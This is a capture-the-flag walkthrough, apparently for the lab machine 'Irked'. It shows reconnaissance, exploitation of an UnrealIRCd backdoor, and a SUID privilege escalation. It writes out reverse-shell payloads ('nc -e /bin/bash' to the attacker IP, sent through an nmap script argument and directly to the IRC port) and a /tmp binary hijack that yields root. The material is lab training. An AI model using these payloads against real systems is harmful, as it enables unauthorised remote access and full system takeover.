---
title: Irked
tags:
  - UnrealIRCd
  - nmap_irc_scripts
  - SUID
---

## Reconnaissance
### Initial Port Scan
```bash
sudo /opt/nmapAutomator/nmapAutomator.sh 10.10.10.117 All
```
* Open Ports
	* 	22 SSH OpenSSH 6.7p1 Debian 5_deb8u4
	 	    80	Http	Apache httpd 2.4.10
	 		111	rcpbind
	 		6697 	irc		UnrealIRCd (Admin email djmardov@irked.htb)
	 		8067	irc		UnrealIRC (Admin email djmradov@irked.htb)
	 		49500	status
        65534	irc 	UnrealIRC (Admin email djmradov@irked.htb)
### Add a host to /etc/hosts
```bash
10.10.10.117	irked.htb
```
## Enumeration
### port 80
* From Port 80, a image is found
![1](image-kgpomj7p.png)
* Nothing special found
### Port 65534
* From the namp initial result, a irc-unralircd is found
#### Run a nmap scan to see which of these ports are vulnerable to the backddor
```bash
sudo nmap -p 6697,8067,65534 --script irc-unrealircd-backdoor 10.10.10.117
```
* Port 8067 is vulnerable
![2](image-kgpqcgru.png)
## Getting a Initial Foothold
### Open a netcat Listener
```bash
sudo nc -lnvp 4444
```
### Using Nmap
```bash
nmap -p 8067 --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command="nc -e /bin/bash 10.10.14.25 4444" 10.10.10.117
```

### Or 
### Using netcat
```bash
nc -n 10.10.10.117 8067

AB; nc 10.10.14.25 4444 -e /bin/bash
```
## Privilege Escalation
### Getting a full TTY 
```bash
python -c "import pty;pty.spawn('/bin/bash')"
ctrl + z
stty raw -echo
fg
```
### Run Linenum.sh
* Transfer from the Kali via python http serber and wget
```bash
chmod +x linenum.sh
./linenum.sh
```
* From the SUID bit set , a unusual thing is found
	* /usr/bin/viewuser 
### Enumerate the file
![3](image-kgpqzdow.png)
* It seems like to run "listusers" in /tmp
	* However, the file "listusers" does not exist at /tmp directory.
### Getting a shell as root
* Since the SUID bit is set for this file, it will execute with the level of privilge that matches the user who owns the file.
	* In this case, the file is owned by root, so the file will execute with root privileges
* Create the file "listusers"  and have it run a bash shell
```bash
echo "bash" > /tmp/listusers
chmod 777 listusers
```
* Execute the "viewuser"
```bash
/usr/bin/viewuser
```
* As a result, a root shell is open.
